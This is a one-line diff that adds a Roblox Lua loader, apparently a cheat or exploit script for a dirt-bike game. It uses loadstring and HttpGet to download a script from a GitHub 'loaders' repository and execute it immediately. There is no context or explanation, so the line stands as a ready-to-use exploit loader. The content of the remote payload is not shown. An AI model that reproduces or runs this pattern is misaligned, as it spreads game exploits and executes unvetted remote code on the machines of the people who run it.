@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Entitybybreed/loaders/main/loaders/nexride-dirtbikes-spam3-jojqh0w7ocfcqz.lua"))()
